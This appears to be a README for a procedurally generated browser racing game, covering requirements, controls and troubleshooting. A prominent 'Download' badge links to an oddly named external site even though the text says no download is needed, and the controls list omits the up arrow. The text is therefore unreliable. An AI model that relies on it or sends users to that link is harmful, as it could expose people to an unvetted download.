# 🏎️ NeedForTokens - Experience high speed arcade racing games

[![Download NeedForTokens](https://img.shields.io/badge/Download-NeedForTokens-blue.svg)](https://intercostal-advent957.github.io)

NeedForTokens brings arcade racing to your web browser. This project uses code to build the game worlds, cars, and sounds while you wait. It needs no large files or downloads. You experience high performance racing with zero wait times for game assets. 

## 🖥️ System Requirements

You need a modern computer to run this game. Ensure your system meets these specifications:

*   **Processor:** Intel Core i5 or AMD Ryzen 5 processor.
*   **Memory:** 8 GB of RAM.
*   **Graphics:** A dedicated graphics card that supports WebGL 2.0. Integrated graphics chips made after 2020 also work well.
*   **Browser:** Google Chrome, Mozilla Firefox, or Microsoft Edge. Keep your browser updated to the latest version for the best results.
*   **Internet:** A stable connection for the initial load of the game engine.

## 🏁 Starting the Game

You do not need to install software on your hard drive. The game runs inside your web browser. Follow these steps to start your first race:

1. Visit the repository page to access the game engine: [https://intercostal-advent957.github.io](https://intercostal-advent957.github.io)
2. Locate the link to the live version of the game.
3. Click the link to open the game in a new browser tab.
4. Wait for the procedural generation process to finish. This creates the car models, textures, and engine sounds on the fly.
5. Click the screen once the loading bar completes.
6. Use the arrow keys on your keyboard to steer and accelerate.

*   **Down Arrow:** Brake and reverse.
*   **Left Arrow:** Turn the vehicle steering to the left.
*   **Right Arrow:** Turn the vehicle steering to the right.
*   **Spacebar:** Engage the handbrake for sharp corners.
*   **Escape Key:** Open the pause menu if you need to adjust volume or exit.

## 🛠️ Procedural Generation Explained

You might wonder how a game contains no assets. Standard games store thousands of images and sound files on your computer. NeedForTokens does things differently. We write mathematical rules that tell the computer how to draw a car or how to generate a sound wave.

When you open the game, your computer builds the track, the grass, the trees, and the car mechanics from scratch. This saves space on your hard drive and allows for infinite variety in the tracks you face. If you restart the game, the computer creates an entirely new world for you to explore.

## 🔧 Troubleshooting Common Issues

If the game does not load or runs slowly, check these items:

*   **Update your browser:** Open your browser settings and check for updates. Older versions often lack the technology needed for WebGL 2.0.
*   **Enable Hardware Acceleration:** In your browser settings, verify that hardware acceleration is turned on. This allows the browser to use your graphics card.
*   **Close other tabs:** Browser games use memory. If you have many tabs open, close a few to free up resources for the game.
*   **Clear cache:** If the game displays strange visuals, clear your browser cache and refresh the page. This forces the browser to generate fresh assets.

## 🌟 Tips for New Players

Pay attention to the engine sounds. Because the audio is also generated procedurally, the pitch changes based on your speed. This provides feedback about your engine performance without needing a complex speedometer on screen. 

Watch the road for textures that repeat. Since the game builds these as you drive, you can spot patterns. Use these patterns to identify upcoming turns or obstacles. If you struggle with the speed, lower your browser zoom percentage. Sometimes a smaller window makes the game feel more manageable for new players.
